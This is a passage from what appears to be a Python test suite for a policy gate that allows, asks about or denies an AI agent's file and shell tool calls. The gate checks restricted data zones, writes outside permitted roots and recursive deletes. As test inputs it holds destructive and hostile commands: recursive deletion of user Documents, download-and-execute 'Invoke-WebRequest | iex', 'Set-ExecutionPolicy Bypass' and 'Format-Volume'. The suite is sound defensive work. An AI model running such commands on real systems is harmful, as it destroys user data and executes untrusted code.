    lambda f: "C:" + "/" * int(65_536 * f) + "\\" * int(65_536 * f) + "late",
    lambda f: "\\\\server\\share" + "\\." * int(100_000 * f) + "\\late",
    lambda f: "C:\\" + "x\\..\\" * int(60_000 * f) + "late",
    lambda f: "C:\\" + "..\\" * int(100_000 * f) + "late",
], ids=["separator-candidate", "drive-separators", "unc-dots", "name-dotdot-pairs", "rooted-dotdots"])
def test_windows_normpath_stays_linear_on_every_host(build):
    # The pure-Python stdlib normpath is quadratic on all of these; the native Windows one is not. The expected value
    # comes from the stdlib rules on a short input of the same shape, which normalizes to the same string.
    expected = _stdlib_pure_ntpath_normpath()(build(1 / 4096))
    _assert_linear(policy_module._windows_normpath, build, expected, vary=False)  # its result is the exact text


def test_mentions_zone_stays_linear_on_long_separator_runs():
    _assert_linear(lambda text: True if mentions_zone(text, ["/restricted"]) else None)


def test_touches_stays_linear_on_long_separator_runs():
    _assert_linear(lambda text: touches({"command": text}, ["/restricted"]))


def test_touches_resolved_stays_linear_on_long_separator_runs():
    _assert_linear(lambda text: touches_resolved({"command": text}, ["/restricted"]))


@pytest.mark.parametrize("path,expected", [
    ("/a/b", "/a/b"),                  # nothing to merge
    ("a//b///c", "a/b/c"),
    ("//a///b", "//a/b"),              # a leading pair is kept: `//host` is implementation-defined on POSIX
    ("//", "//"),
    ("///a", "/a"),                    # three or more leading separators are one
    ("////", "/"),
    ("/a\\\\b", "/a\\\\b"),            # a backslash is an ordinary character on POSIX
    ("", ""),
])
def test_separator_runs_merge_but_a_leading_pair_stays(path, expected):
    assert policy_module._collapse_separators(path, nt=False) == expected


@pytest.mark.parametrize("path", ["C:\\a//b", "\\\\server\\share\\x", "//?/C:/x", "//a//", "///a"])
def test_a_windows_path_is_returned_as_written(path):
    """Merging the separators of `//a//` (a UNC prefix with no share) changes what ntpath.realpath returns."""
    assert policy_module._collapse_separators(path, nt=True) == path


def test_merging_separator_runs_never_changes_what_posix_realpath_returns():
    """The merged path names the same place: realpath's answer for it is the one it gives the original."""
    cases = ["".join(chars) for n in range(7) for chars in itertools.product("/.ab", repeat=n)]
    cases += ["///a//..//b", "a//b/./c", "//host//share/../x", "/a/b//../c///d"]
    assert [posixpath.realpath(policy_module._collapse_separators(case, nt=False)) for case in cases] ==         [posixpath.realpath(case) for case in cases]


def test_the_policy_realpath_stays_linear_on_long_separator_runs():
    """#1158: CPython's POSIX realpath is quadratic in a run of separators (0.03 s, 0.12, 0.44, 1.75 s per doubling).
    Windows' own is not, so this only shows on Linux and macOS, where it failed at 7-16x over four times the input."""
    _assert_linear(lambda text: policy_module._real(text) and None)


@pytest.fixture
def posix_merge(monkeypatch):
    """The merge as a POSIX host runs it, on any host: the merge itself returns a Windows path as written."""
    merge = policy_module._collapse_separators
    monkeypatch.setattr(policy_module, "_collapse_separators", lambda p, *, nt=None: merge(p, nt=False))


def test_the_policy_realpath_takes_what_os_path_realpath_takes(tmp_path, posix_merge):
    """#1159: `_root_rules` hands it a `Path`, and a `Path` has no `lstrip`."""
    root = tmp_path / "work" / "run"
    spelled = f"{tmp_path}//work///run"
    assert policy_module._realpath(root) == os.path.realpath(root)
    assert policy_module._realpath(spelled) == os.path.realpath(spelled)
    assert policy_module._realpath(os.fsencode(spelled)) == os.path.realpath(os.fsencode(spelled))  # bytes pass through


def test_root_rules_accept_path_roots_and_name_each_root_alike(tmp_path, posix_merge):
    """A `Path` root and the same root as text give the same rules, with a run of separators in the text too."""
    (tmp_path / "work").mkdir()
    as_path = policy_module._root_rules("Read", [tmp_path / "work"])
    as_text = policy_module._root_rules("Read", [str(tmp_path / "work")])
    assert as_path and as_path == as_text
    assert policy_module._root_rules("Read", [f"{tmp_path}///work"]) == as_text


def test_a_collapsed_candidate_gives_the_same_policy_decision(monkeypatch):
    """The policy decides alike with and without the merge, so long separator runs change its time, not its answer."""
    run = "/" * 5000
    spellings = [f"/data{run}cohort/a.vcf", f"/data/{run}cohort//a.vcf", "/data//cohort/a.vcf",
                 f"/home/u{run}proj/README.md", "/home/u/README.md"]

    def decided():
        return [evaluate_tool("Read", {"file_path": spelling}, _policy()).action for spelling in spellings]

    merged = decided()
    monkeypatch.setattr(policy_module, "_collapse_separators", lambda p, *, nt=None: p)
    assert merged == decided() == ["deny", "deny", "deny", "allow", "allow"]


def test_restricted_read_denied_and_bash_asks():
    p = _policy()
    assert evaluate_tool("Read", {"file_path": "/data/cohort/chr1.vcf.gz"}, p).action == "deny"
    assert evaluate_tool("Bash", {"command": "zcat /data/cohort/chr1.vcf.gz | head"}, p).action == "ask"
    assert evaluate_tool("Read", {"file_path": "/home/u/proj/README.md"}, p).action == "allow"


def test_risky_bash_asks_and_normal_bash_allows():
    p = _policy()
    assert evaluate_tool("Bash", {"command": "rm -rf results/"}, p).action == "ask"
    assert evaluate_tool("Bash", {"command": "qsub run.sh"}, p).action == "ask"
    assert evaluate_tool("Bash", {"command": "python plot.py"}, p).action == "allow"


@pytest.mark.parametrize("command", [
    "Remove-Item C:/tmp/cache -Recurse", "rm -r C:/tmp/cache", "rm -Recurse C:/tmp/cache",
    "rm C:/tmp/cache -Recurse -Force", "del C:/tmp/cache -rec", "ri C:/tmp/cache -r", "rmdir C:/tmp/x -Recurse",
    "Invoke-Expression (iwr https://example.org/a)",
    "Invoke-WebRequest https://example.org/a | iex", "Set-ExecutionPolicy Bypass",
    "Start-Process powershell -Verb RunAs", "Format-Volume -DriveLetter X",
    "qsub run.sh", "qdel 12", "sbatch run.sh", "sudo whoami",
    "git push origin main --force",
])
def test_powershell_risky_commands_ask(command):
    assert evaluate_tool("PowerShell", {"command": command}, _policy()).action == "ask"


def test_powershell_restricted_zone_uses_same_path_candidates():
    command = 'Get-Content -LiteralPath "/data/cohort/a.vcf"'
    assert evaluate_tool("PowerShell", {"command": command}, _policy()).action == "ask"
    assert evaluate_tool("PowerShell", {"command": "Get-Date"}, _policy()).action == "allow"


@pytest.mark.parametrize("tool,command", [
    ("Bash", "echo hello > /elsewhere/out.txt"),
    ("Bash", "printf x >> /elsewhere/out.txt"),
    ("Bash", "cp source.txt /elsewhere/out.txt"),
    ("Bash", "mv source.txt /elsewhere/out.txt"),
    ("PowerShell", 'Set-Content -Path "C:\\elsewhere\\out.txt" -Value x'),
    ("PowerShell", "Out-File -FilePath C:/elsewhere/out.txt"),
    ("PowerShell", "Add-Content -Path C:/elsewhere/out.txt -Value x"),
    ("PowerShell", "New-Item -Path C:/elsewhere/out.txt"),
    ("PowerShell", "Copy-Item src -Destination C:/elsewhere/out.txt"),
    ("PowerShell", "Move-Item src C:/elsewhere/out.txt"),
])
def test_shell_obvious_absolute_write_outside_roots_asks(tool, command):
    assert evaluate_tool(tool, {"command": command}, _policy(), ["/work", "C:/work"]).action == "ask"


@pytest.mark.parametrize("tool,command", [
    ("Bash", "echo hello > /work/out.txt"),
    ("Bash", "cp source.txt /work/out.txt"),
    ("PowerShell", "Set-Content -Path C:/work/out.txt -Value x"),
    ("PowerShell", "Copy-Item src -Destination C:/work/out.txt"),
])
def test_shell_obvious_absolute_write_inside_roots_allows(tool, command):
    assert evaluate_tool(tool, {"command": command}, _policy(), ["/work", "C:/work"]).action == "allow"


def test_write_outside_roots_asks():
    p = _policy()
    assert evaluate_tool("Write", {"file_path": "/etc/passwd"}, p, allowed_roots=["/w/task"]).action == "ask"
    assert evaluate_tool("Write", {"file_path": "/w/task/outputs/a.md"}, p, allowed_roots=["/w/task"]).action == "allow"


def test_path_normalization_boundary_and_shell_forms():
    zone = r"C:\Data\Cohort"
    assert touches({"command": r'cat --in="c:/data/cohort/A.vcf"'}, [zone]) == zone
    assert touches({"command": r"copy host:C:\Data\Cohort\A.vcf"}, [zone]) == zone
    assert evaluate_tool("Read", {"file_path": "c:/DATA/cohort/A.vcf"},
                         PolicySettings(data_zones=[DataZone(path=zone)])).action == "deny"
    assert touches({"file_path": r"c:/DATA/cohort2/A.vcf"}, [zone]) is None
    assert touches({"command": "cat ../cohort/a.vcf"}, ["/data/cohort"], workdir="/data/task")
    assert touches({"command": "cat /data/cohort2/a.vcf"}, ["/data/cohort"]) is None


@pytest.mark.parametrize("command", [
    "docker run -v /data/cohort:/mnt img",
    "scp host:/data/cohort/a.vcf .",
    "rsync src:/data/cohort/ dst/",
    "cat file:///data/cohort/a.vcf",
    "cat file:///data/%2e/cohort/a.vcf",
    "cat file://localhost/data/./cohort/a.vcf",
    "cat file:///data/%63ohort?download=1",
    "cat file:///data/%63ohort#section",
    "cat file:///data/%63ohort/a.vcf",
    "cat --input=host:file:///data/cohort/a.vcf",
    "cat --input=s3like:/data/cohort",
    "cat</data/cohort/a",
    "$(cat /data/cohort/a)",
])
def test_embedded_absolute_restricted_path_asks(command):
    assert touches({"command": command}, ["/data/cohort"]) == "/data/cohort"
    assert evaluate_tool("Bash", {"command": command}, _policy()).action == "ask"


@pytest.mark.parametrize("command", [
    "docker run -v /data/cohort2:/mnt img",
    "scp host:/data/cohort2/a.vcf .",
    "cat file:///data/cohort2/a.vcf",
    "cat --input=s3like:/data/cohort2",
])
def test_embedded_neighbor_path_does_not_match(command):
    assert touches({"command": command}, ["/data/cohort"]) is None
    assert evaluate_tool("Bash", {"command": command}, _policy()).action == "allow"


def test_absolute_path_containing_zone_as_middle_suffix_does_not_match():
    path = "/scratch/data/cohort/report.txt"
    assert touches({"file_path": path}, ["/data/cohort"]) is None
    assert touches({"command": f"cat --input={path}"}, ["/data/cohort"]) is None
    assert evaluate_tool("Read", {"file_path": path}, _policy()).action == "allow"
    assert evaluate_tool("Bash", {"command": f"cat {path}"}, _policy()).action == "allow"


def test_restricted_zone_with_spaces_in_structured_and_shell_paths():
    zone = "/data/controlled cohort"
    policy = PolicySettings(data_zones=[DataZone(path=zone)])
    path = f"{zone}/a.vcf"
    for key in ("file_path", "notebook_path", "path"):
        assert touches({key: path}, [zone]) == zone
    assert evaluate_tool("Read", {"file_path": path}, policy).action == "deny"
    assert evaluate_tool("NotebookRead", {"notebook_path": path}, policy).action == "deny"
    assert evaluate_tool("Read", {"path": path}, policy).action == "deny"
    for command in (f'cat "{path}"', f"cat '{path}'", f"cat {path}"):
        assert touches({"command": command}, [zone]) == zone
        assert evaluate_tool("Bash", {"command": command}, policy).action == "ask"
    escaped = r"cat /data/controlled\ cohort/a.vcf"
    assert touches({"command": escaped}, [zone]) == zone
    assert evaluate_tool("Bash", {"command": escaped}, policy).action == "ask"

    neighbor = "/data/controlled cohorts/x"
    assert touches({"file_path": neighbor}, [zone]) is None
    assert evaluate_tool("Read", {"file_path": neighbor}, policy).action == "allow"
    assert touches({"command": f"cat {neighbor}"}, [zone]) is None
    assert evaluate_tool("Bash", {"command": f"cat {neighbor}"}, policy).action == "allow"
    escaped_neighbor = r"cat /data/controlled\ cohorts/x"
    assert touches({"command": escaped_neighbor}, [zone]) is None
    assert evaluate_tool("Bash", {"command": escaped_neighbor}, policy).action == "allow"
    outside = "/scratch/data/controlled cohort/x"
    assert touches({"command": f"cat {outside}"}, [zone]) is None
    assert evaluate_tool("Bash", {"command": f"cat {outside}"}, policy).action == "allow"
    windows_zone = r"C:\Data\Controlled Cohort"
    assert touches({"command": "type c:/DATA/controlled cohort/x"}, [windows_zone]) == windows_zone
    assert touches({"command": "type c:/DATA/controlled cohorts/x"}, [windows_zone]) is None
    assert touches({"command": r"type C:\data\x"}, [r"C:\data"]) == r"C:\data"


def test_unc_paths_are_compared_but_not_exported_as_unverified_claude_rules():
    zone = r"\\server\share\cohort"
    assert touches({"file_path": "//SERVER/share/cohort/a.vcf"}, [zone]) == zone
    assert touches({"file_path": "//server/share/cohort2/a.vcf"}, [zone]) is None
    with pytest.raises(ValueError, match="UNC"):
        claude_rule_path(zone)
    with pytest.raises(ValueError, match="UNC"):
        claude_settings(PolicySettings(data_zones=[DataZone(path=zone)]))


def test_relative_write_resolved_against_workdir():
    p = _policy()
    roots = ["/work/task"]
    assert evaluate_tool("Write", {"file_path": "out/report.txt"}, p, roots, workdir="/work/task").action == "allow"
    assert evaluate_tool("Write", {"file_path": "../outside.txt"}, p, roots, workdir="/work/task").action == "ask"
    assert evaluate_tool("Write", {"file_path": "out/report.txt"}, p, roots).action == "ask"
    assert evaluate_tool("Write", {"file_path": "/work/task2/a"}, p, roots).action == "ask"
    assert evaluate_tool("Write", {"file_path": "../cohort/a"}, p, ["/data/task"], workdir="/data/task").action == "deny"


def test_drive_rooted_backslash_is_absolute_without_a_drive_letter():
    path = r"\Windows\System32\drivers\etc\hosts"
    assert evaluate_tool("Write", {"file_path": path}, _policy(),
                         allowed_roots=[r"C:\work\task"], workdir=r"C:\work\task").action == "ask"
    assert touches({"file_path": r"\data\cohort\a.vcf"}, ["/data/cohort"],
                   workdir=r"C:\work\task") == "/data/cohort"


def test_drive_relative_path_never_uses_workdir_as_its_base():
    zone = r"C:\data\cohort"
    p = PolicySettings(data_zones=[DataZone(path=zone)])
    roots = [r"C:\work\task"]
    for path in (r"C:outside.txt", r"c:..\data\cohort\a.vcf"):
        assert evaluate_tool("Write", {"file_path": path}, p, roots,
                             workdir=r"C:\work\task").action == "ask"
        assert touches({"file_path": path}, [zone], workdir=r"C:\work\task") == zone
        assert evaluate_tool("Read", {"file_path": path}, p, roots,
                             workdir=r"C:\work\task").action == "deny"
    assert evaluate_tool("Bash", {"command": "cat --input=C:outside.txt"}, p,
                         workdir=r"C:\work\task").action == "ask"
    assert touches({"command": "cat D:outside.txt"}, [zone], workdir=r"C:\work\task") is None


def test_relative_zone_is_rejected_at_config_load(tmp_path):
    from labhq.settings import Settings

    config = tmp_path / "config.yaml"
    config.write_text("policy:\n  data_zones:\n    - path: ../cohort\n")
    with pytest.raises(ValueError, match="must be absolute"):
        Settings.load(str(config))


def test_claude_settings_absolute_rule_syntax():
    deny = claude_settings(_policy())["permissions"]["deny"]
    assert "Read(//data/cohort/**)" in deny


def test_hpc_thresholds():
    p = _policy()
    assert hpc_needs_approval(1, "00:10:00", p)  # threshold 0 → always ask
    p.approvals.hpc_core_hours_threshold = 10
    assert not hpc_needs_approval(2, "02:00:00", p) and hpc_needs_approval(8, "04:00:00", p)
    assert core_hours(4, "1-00:00:00") == 96


@pytest.mark.parametrize("threshold,expected", [(0, True), (10, False), (9.9, True)])
def test_estimated_walltime_keeps_core_hour_approval_boundary(threshold, expected):
    p = _policy()
    p.approvals.hpc_core_hours_threshold = threshold
    assert core_hours(2, "05:00:00") == 10
    assert hpc_needs_approval(2, "05:00:00", p) is expected



@pytest.mark.parametrize("tool,command", [
    ("Bash", "python analysis.py 2>/dev/null"), ("Bash", "git status >/dev/null 2>&1"),
    ("PowerShell", "Get-ChildItem > $null"), ("PowerShell", "cmd /c dir > NUL"),
])
def test_null_device_redirects_are_not_writes(tool, command):
    assert evaluate_tool(tool, {"command": command}, _policy(), ["/work", "C:/work"]).action == "allow"


@pytest.mark.parametrize("command", [
    'curl -s -o /dev/null -w "%{http_code}" "https://example.org/x"',  # trial 2026-10-08 asked the PI for this
    "echo x | tee /dev/null", "cp out.txt /dev/null",
])
def test_a_command_writing_to_a_null_device_is_not_a_write(command):
    assert evaluate_tool("Bash", {"command": command}, _policy(), ["/work", "C:/work"]).action == "allow"
    # Any other target outside the roots still asks.
    other = command.replace("/dev/null", "/elsewhere/out.txt")
    assert evaluate_tool("Bash", {"command": other}, _policy(), ["/work", "C:/work"]).action == "ask"


def test_non_recursive_rm_is_allowed():
    assert evaluate_tool("PowerShell", {"command": "rm C:/work/tmp.txt"}, _policy()).action == "allow"


@pytest.mark.parametrize("command", [
    "rm -rf .tmp",
    "rm -rf .tmp/cache",
    "rm -r .tmp/cache",
])
def test_single_recursive_delete_below_step_tmp_is_allowed(command):
    decision = evaluate_tool("Bash", {"command": command}, _policy(),
                             allowed_roots=["/work/step"], workdir="/work/step")
    assert decision.action == "allow"


@pytest.mark.parametrize("command", [
    "Remove-Item -Recurse -Force .tmp",
    r"Remove-Item -Recurse .tmp\a",
])
def test_single_powershell_recursive_delete_below_step_tmp_is_allowed(command):
    decision = evaluate_tool("PowerShell", {"command": command}, _policy(),
                             allowed_roots=["C:/work/step"], workdir="C:/work/step")
    assert decision.action == "allow"


@pytest.mark.parametrize("tool,command,workdir", [
    ("Bash", "rm -rf inputs/upstream/subdir", "/work/step"),
    ("Bash", "rm -rf outputs/tmp", "/work/step"),
    ("Bash", "command cd .. && rm -rf sibling", "/work/step"),
    ("Bash", "cd .tmp && rm -rf x", "/work/step"),
    ("PowerShell", r"Microsoft.PowerShell.Management\Set-Location ..; Remove-Item -Recurse sibling",
     "C:/work/step"),
    ("Bash", "rm -rf .tmp; rm -rf x", "/work/step"),
])
def test_recursive_delete_requires_a_single_simple_command_below_step_tmp(tool, command, workdir):
    decision = evaluate_tool(tool, {"command": command}, _policy(),
                             allowed_roots=[workdir], workdir=workdir)
    assert decision.action == "ask"
    assert decision.reason.startswith("재귀 삭제 확인 필요: `")


def test_recursive_delete_below_linked_step_tmp_asks(tmp_path):
    target = tmp_path / "linked"
    target.mkdir()
    try:
        (tmp_path / ".tmp").symlink_to(target, target_is_directory=True)
    except OSError as exc:
        pytest.skip(f"directory symlink unavailable: {exc}")

    decision = evaluate_tool("Bash", {"command": "rm -rf .tmp/cache"}, _policy(),
                             allowed_roots=[str(tmp_path)], workdir=str(tmp_path))
    assert decision.action == "ask"
    assert decision.reason.startswith("재귀 삭제 확인 필요: `")


@pytest.mark.parametrize("command", ["rm -rf .tmp/link/", "rm -rf .tmp/link/.", "rm -rf .tmp/link"])
def test_recursive_delete_of_a_linked_target_below_step_tmp_asks(tmp_path, command):
    """#501 review: `rm -rf .tmp/link/` follows a directory link out of the step folder."""
    outside = tmp_path / "outside"
    outside.mkdir()
    (tmp_path / ".tmp").mkdir()
    try:
        (tmp_path / ".tmp" / "link").symlink_to(outside, target_is_directory=True)
    except OSError as exc:
        pytest.skip(f"directory symlink unavailable: {exc}")

    decision = evaluate_tool("Bash", {"command": command}, _policy(),
                             allowed_roots=[str(tmp_path)], workdir=str(tmp_path))
    assert decision.action == "ask"


@pytest.mark.parametrize("command", [
    r"Remove-Item -Recurse -Force HKCU:\Software\X",
    r"Remove-Item -Recurse Cert:\CurrentUser\My",
    "Remove-Item -Recurse -Force .tmp,C:/outside",
    r"Remove-Item -Recurse -Path @('.tmp','..\x')",
    "Get-ChildItem .tmp | Remove-Item -Recurse",
    r"Remove-Item -Recurse -LiteralPath \\server\share\tmp",
    "Remove-Item -Recurse -Path ~",
    "Remove-Item -Recurse -Path $target",
    "Remove-Item -Recurse -Path $(Join-Path . .tmp)",
    "Remove-Item -Recurse -Path ${target}",
    "Remove-Item -Recurse -Path %TEMP%",
    "Remove-Item -Recurse -Path !TEMP!",
    "Remove-Item -Recurse -Path *.tmp",
    "Remove-Item -Recurse -Path",
])
def test_powershell_recursive_delete_requires_literal_filesystem_targets(command):
    decision = evaluate_tool("PowerShell", {"command": command}, _policy(),
                             allowed_roots=["C:/work/step"], workdir="C:/work/step")
    assert decision.action == "ask"
    assert decision.reason.startswith("재귀 삭제 확인 필요: `")


@pytest.mark.parametrize("command", [
    "rm -rf ../x",
    "rm -rf $DIR",
    'rm -rf "$D"',
    "rm -rf /tmp/x",
    "rm -rf .tmp ../x",
])
def test_recursive_delete_outside_or_unresolved_still_asks(command):
    decision = evaluate_tool("Bash", {"command": command}, _policy(),
                             allowed_roots=["/work/step"], workdir="/work/step")
    assert decision.action == "ask"
    assert decision.reason.startswith("재귀 삭제 확인 필요: `")
    assert "(/" not in decision.reason


def test_other_risky_command_summary_has_a_korean_label_without_the_regex():
    decision = evaluate_tool("Bash", {"command": "qsub run.sh"}, _policy())
    assert decision.reason == "위험 명령 확인 필요: `qsub run.sh`"


def test_a_tool_without_a_rule_asks_instead_of_being_allowed():
    """#421: an unclassified tool used to fall through to allow. Monitor runs a shell command the Bash checks never
    see; tools measured in trial records (StructuredOutput, ToolSearch) and the configured list stay allowed."""
    p = PolicySettings()
    monitor = evaluate_tool("Monitor", {"command": "until cat /data/cohort/x; do sleep 2; done"}, p)
    assert monitor.action == "ask" and "auto_allow_tools" in monitor.reason
    # BashOutput/KillShell and TaskOutput/TaskStop only read or stop a background shell the gated Bash started:
    # asking the PI for each would bury the cards that matter (#518 follow-up).
    for tool in ("StructuredOutput", "ToolSearch", "WebSearch", "WebFetch", "TodoWrite", "Skill",
                 "BashOutput", "KillShell", "TaskOutput", "TaskStop"):
        assert evaluate_tool(tool, {}, p).action == "allow", tool
    p.approvals.auto_allow_tools.append("Monitor")
    assert evaluate_tool("Monitor", {"command": "true"}, p).action == "allow"


@pytest.mark.parametrize("tool", ["Workflow", "TeamCreate", "TeamDelete", "Task", "Agent"])
def test_native_delegation_tools_are_denied_even_if_configured_for_auto_allow(tool):
    """#421: native delegation bypasses labhq's approval, event and cost accounting."""
    p = PolicySettings()
    p.approvals.auto_allow_tools.append(tool)
    decision = evaluate_tool(tool, {}, p)
    assert decision.action == "deny"
    assert "labhq" in decision.reason


def test_example_configs_publish_the_same_non_delegating_auto_allow_list():
    root = Path(__file__).resolve().parents[1]
    public = root / "config" / "labhq.example.yaml"
    packaged = root / "labhq" / "config" / "labhq.example.yaml"
    assert public.read_bytes() == packaged.read_bytes()
    data = yaml.safe_load(public.read_text(encoding="utf-8"))
    configured = data["policy"]["approvals"]["auto_allow_tools"]
    assert configured == PolicySettings().approvals.auto_allow_tools
    assert not {"Task", "Agent", "Workflow", "TeamCreate", "TeamDelete"} & set(configured)
    assert Settings.model_validate(data).policy.approvals.auto_allow_tools == configured


def test_a_config_written_from_the_518_template_gets_the_background_shell_tools():
    """#520 review: `labhq init` wrote the #518 list explicitly, which replaced the newer default on load."""
    template = ["Read", "Glob", "Grep", "LS", "WebSearch", "WebFetch", "TodoWrite", "Skill", "StructuredOutput",
                "ToolSearch"]
    loaded = Settings.model_validate({"policy": {"approvals": {"auto_allow_tools": template}}})
    assert loaded.policy.approvals.auto_allow_tools == [*template, "BashOutput", "KillShell", "TaskOutput", "TaskStop"]
    assert evaluate_tool("TaskOutput", {}, loaded.policy).action == "allow"
    edited = ["Read", "Glob"]  # a list the PI edited stays as written
    kept = Settings.model_validate({"policy": {"approvals": {"auto_allow_tools": edited}}})
    assert kept.policy.approvals.auto_allow_tools == edited


WINDOWS_STEP = "C:/Users/pi/labhq/work/req/step"


def _decide_in_windows_step(command):
    return evaluate_tool("Bash", {"command": command}, _policy(), [WINDOWS_STEP], WINDOWS_STEP, windows=True)


@pytest.mark.parametrize("command", [
    # rm reads options anywhere before `--`; only the first cluster was read (cross review #17).
    "rm -f -r C:/Users/pi/Documents",
    "rm -v -rf C:/Users/pi/Documents",
    "rm --recursive --force C:/Users/pi/Documents",
    "rm --rec C:/Users/pi/Documents",
    "rm C:/Users/pi/Documents -rf",
    "RM -f -R C:/Users/pi/Documents",
    "sh -c 'rm -f -r C:/Users/pi/Documents'",
    "rm -f -r results/",
    # A find that deletes outside the write roots, or from a start the gate cannot place.
    "find C:/Users/pi/Documents -delete",
    "find /c/Users/pi/Documents -name '*.docx' -exec rm {} +",
    r"find C:/Users/pi/Documents -type f -execdir rm -f {} \;",
    r"""find C:/Users/pi/Documents -exec sh -c 'rm "$1"' _ {} \;""",
    "find C:/Users/pi/Documents -type f | xargs rm -f",
    "find ../ -delete",
    'find "$D" -delete',
    "find $(pwd) -delete",
    "find -L . -delete",
    "cd .. && find . -delete",
    "sudo find . -delete",
    # One rule for every recursive delete: inside the roots but outside `.tmp` (outputs/ holds evidence) asks, as
    # `rm -rf outputs/x` does; a pipe or redirection makes it more than one simple command, as it does for rm.
    "find . -name '*.pyc' -delete",
    "find -name '*.pyc' -delete",
    r"find outputs -name '*.part' -exec rm {} \;",
    f"find {WINDOWS_STEP}/.tmp -delete",
    "find . -name '*.part' | xargs rm",
    "find .tmp -name '*.part' | xargs rm",
    "find .tmp -type f -delete 2>/dev/null",
])
def test_recursive_deletes_in_every_option_form_ask_outside_the_step(command):
    decision = _decide_in_windows_step(command)
    assert decision.action == "ask"
    assert decision.reason.startswith("재귀 삭제 확인 필요: `")


@pytest.mark.parametrize("command", [
    "rm -f -r .tmp/cache",
    "rm -v -rf .tmp/cache",
    "rm --recursive --force .tmp/cache",
    "find .tmp -type f -delete",
    "find .tmp/cache .tmp/parts -name '*.part' -delete",
    r"find .tmp -name '*.part' -exec rm {} \;",
    "find . -name x -exec grep -l y {} +",
    "docker run --rm -v data:/data img nextflow run x -profile docker",
    # #533: an rm payload's literal targets below .tmp pass; an operand after `--`, a glob and a later brace list
    # cannot be options.
    "find .tmp -name '*.part' -exec rm -f -- {} +",
    r"find .tmp -name '*.part' -exec rm -f .tmp/stale.lock {} \;",
    'rm -f -- "$f"',
    "rm -f *.log out.{bam,bai}",
    'echo "rm"',
])
def test_deletes_below_step_tmp_and_commands_that_delete_nothing_stay_allowed(command):
    assert _decide_in_windows_step(command).action == "allow"


@pytest.mark.parametrize("command", [
    # #533: a find payload whose delete the gate cannot read, or that deletes outside .tmp, asks.
    r"find .tmp -exec rm $'-rf' /outside \;",
    r"find .tmp -exec rm -f /outside \;",
    r"find .tmp -exec rm -f ../x {} \;",
    r"find .tmp -exec $CMD {} \;",
    r'find .tmp -exec "$RM" -f {} +',
    r"find .tmp -exec env rm -f C:/Users/pi/Documents/x \;",
    r"find .tmp -execdir rm -f x \;",
    r"find .tmp -exec rm {}.bak \;",
    r'find .tmp -ok rm -- "$X" \;',
    # An rm option word the gate cannot read may be `-r`.
    "rm $'-rf' C:/Users/pi/Documents",
    'rm "$OPT" C:/Users/pi/Documents',
    'rm -f"$X" C:/Users/pi/Documents',
    "rm {-r,-f} C:/Users/pi/Documents",
    "rm `printf -- -rf` C:/Users/pi/Documents",
])
def test_find_payloads_and_rm_options_the_gate_cannot_read_ask(command):
    decision = _decide_in_windows_step(command)
    assert decision.action == "ask"
    assert decision.reason.startswith("재귀 삭제 확인 필요: `")


@pytest.mark.parametrize("command", [
    # #535 follow-up: only a real rm meets the recursive-delete rule; `docker rm` is another program's subcommand.
    'docker rm "$id"', "docker rm -f $(docker ps -aq)",
    # `git rm` removes files in the current tree only, as `git add` writes there.
    'git rm "$f"', 'git rm -r "$d"', "git rm -r --cached outputs/old", "git log --grep rm -r",
    # One double-quoted computed word as the only operand: one option cluster with nothing to delete, or one file.
    'rm -f "$f"', 'rm "$tmp"', 'rm -fv "${out}.tmp"',
])
def test_rm_words_that_cannot_delete_recursively_stay_allowed(command):
    assert _decide_in_windows_step(command).action == "allow"


@pytest.mark.parametrize("command", [
    # A git rm the options or environment may point at another tree.
    "git -C C:/Users/pi/repo rm notes.txt", "git --work-tree=C:/Users/pi rm -r Documents",
    'git --git-dir "$G" rm f', 'git "$OPT" rm f', "GIT_WORK_TREE=C:/Users/pi git rm Documents/x",
    "git -c core.worktree=C:/Users/pi rm Documents/x", "git -c alias.x='!rm -rf C:/Users/pi/Documents' x",
    # Computed words rm may read as options, and real rms after a wrapper, a computed program or a redirection.
    'rm -f "$a" "$b"', "rm -f $f", 'rm -f "$f" C:/Users/pi/x', 'rm C:/Users/pi/x "$f"', 'rm -r "$f"',
    "sudo rm -rf C:/Users/pi/Documents", '"$RUNNER" rm -rf C:/Users/pi/Documents',
    "2>/dev/null rm -rf C:/Users/pi/Documents",
])
def test_git_rm_into_another_tree_and_unreadable_rm_operands_ask(command):
    decision = _decide_in_windows_step(command)
    assert decision.action == "ask"
    assert decision.reason.startswith("재귀 삭제 확인 필요: `")


@pytest.mark.parametrize("start", [".tmp/link", ".tmp/link/"])
def test_a_find_delete_whose_start_is_a_link_out_of_the_step_asks(tmp_path, start):
    outside = tmp_path / "outside"
    outside.mkdir()
    step = tmp_path / "step"
    (step / ".tmp").mkdir(parents=True)
    try:
        (step / ".tmp" / "link").symlink_to(outside, target_is_directory=True)
    except OSError as exc:
        pytest.skip(f"directory symlink unavailable: {exc}")

    decision = evaluate_tool("Bash", {"command": f"find {start} -delete"}, _policy(),
                             allowed_roots=[str(step)], workdir=str(step))
    assert decision.action == "ask"


@pytest.mark.parametrize("tool,command", [
    ("Bash", "cmd //c rd //s //q C:/Users/pi/Documents"),
    ("PowerShell", "cmd /c rmdir /S /Q C:/Users/pi/Documents"),
    ("PowerShell", 'cmd /c "del /s /q C:/Users/pi/Documents/*.docx"'),
    ("PowerShell", "Get-ChildItem C:/Users/pi/Documents -Recurse | Remove-Item -Force"),
    ("PowerShell", "gci C:/Users/pi/Documents -r -File | Where-Object Length -gt 0 | rm"),
])
def test_cmd_and_piped_powershell_recursive_deletes_ask(tool, command):
    decision = evaluate_tool(tool, {"command": command}, _policy(), [WINDOWS_STEP], WINDOWS_STEP, windows=True)
    assert decision.action == "ask"
    assert decision.reason.startswith("재귀 삭제 확인 필요: `")


@pytest.mark.parametrize("command", [
    "Get-ChildItem . -Recurse -Filter *.csv | Select-Object Name",
    "Get-ChildItem -Recurse | Measure-Object",
    "rd .tmp/empty",
])
def test_recursive_listings_and_plain_rd_in_powershell_stay_allowed(command):
    decision = evaluate_tool("PowerShell", {"command": command}, _policy(), [WINDOWS_STEP], WINDOWS_STEP,
                             windows=True)
    assert decision.action == "allow"


def _decide_powershell_in_windows_step(command):
    return evaluate_tool("PowerShell", {"command": command}, _policy(), [WINDOWS_STEP], WINDOWS_STEP, windows=True)


@pytest.mark.parametrize("command", [
    # PR #525 review: a delete after the first pipe, in a script block too, removes what the listing found.
    "Get-ChildItem C:/Users/pi/Documents -Recurse -File | ForEach-Object { Remove-Item $_ -Force }",
    "gci C:/Users/pi/Documents -r | % { rm $_.FullName }",
    "gci C:/Users/pi/Documents -r -File | % { $_.Delete() }",
    'gci C:/Users/pi/Documents -r | % { iex "Remove-Item $_" }',
